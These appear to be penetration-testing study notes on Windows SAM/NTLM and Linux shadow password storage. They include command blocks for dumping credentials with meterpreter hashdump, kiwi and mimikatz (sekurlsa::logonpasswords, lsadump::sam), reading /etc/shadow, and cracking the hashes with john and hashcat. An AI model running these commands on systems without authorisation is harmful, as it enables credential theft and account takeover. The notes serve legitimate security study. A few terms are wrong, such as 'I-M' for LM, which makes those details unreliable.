# Windows
- The Windows OS stores hashed user account passwords locally in the SAM (Security Accounts Manager) database.
- Authentication and verification of user credentials is facilitated by the Local Security Authority (LSA).
- Windows versions up to Windows Server 2003 utilize two different types of hashes:
	- LM
	-  NTLM
- Windows disables I-M hashing and utilizes NTLM hashing from Windows Vista onwards.
- SAM (Security Account Manager) is a database file that is responsible for managing user accounts and passwords on Windows. All user account passwords stored in the SAM database are hashed.
- The SAM database file cannot be copied while the operating system is running.
- The Windows NT kernel keeps the SAM database file locked and as a result, attackers typically utilize in-memory techniques and tools to dump SAM hashes from the LSASS process.
- In modern versions of Windows, the SAM database is encrypted with a syskey.
- NTLM is a collection of authentication protocols that are utilized in Windows to facilitate authentication between computers. The authentication process involves using a valid username and password to authenticate successfully.
- When a user account is created, it is encrypted using the MD4 hashing algorithm, while the original password is disposed of.
- NTLM improves upon LM in the following ways:
	- Does not split the hash in to two chunks.
	- Case sensitive.
	- Allows the use of symbols and unicode characters.
## Dumping 
```
[*] On meterpreter
hashdump

load kiwi
creds_all
lsa_dump_sam
lsa_dump_secrets

[*] For manual use of mimikatz
upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe
shell
.\mimikatz.exe
privilege::debug
sekurlsa::logonpasswords
lsadump::sam
```

## Cracking
```
[!] Hash type depends of the system
john --format=NT hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
hashcat -a 0 -m 1000 hashes.txt rockyou.txt -o cracked.txt
```

# Linux
- Linux has multi-user support and as a result, multiple users can access the system simultaneously. This can be seen as both an advantage and disadvantage from a security perspective, in that, multiple accounts offer multiple access vectors for attackers and therefore increase the overall risk of the server.
- All of the information for all accounts on Linux is stored in the passwd file located in: /etc/passwd
- We cannot view the passwords for the users in the passwd file because they are encrypted and the passwd file is readable by any user on the system.
- All the encrypted passwords for the users are stored in the shadow file. it can be found in the following directory: /etc/shadow
- The shadow file can only be accessed and read by the root account, this is a very important security feature as it prevents other accounts on the system from accessing the hashed passwords.
- The shadow file gives us information in regards to the hashing algorithm that is being used and the password hash, this is very helpful as we are able to determine the type of hashing algorithm that is being used and its strength. We can determine this by looking at the number after the username encapsulated by the dollar symbol ($).

	|Value|Hashing Algorithm|
	|---|---|
	|$1|MD5|
	|$2|Blowfish|
	|$5|SHA-256|
	|$6|SHA-512|

## Dumping 
```
[*] On meterpreter
linux/gather/hashdump

[*] On shell
cat /etc/shadow
```

## Cracking
```
[!] Hash type depends of the system
john --format=sha512crypt hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
hashcat -a 0 -m 1800 hashes.txt rockyou.txt -o cracked.txt
```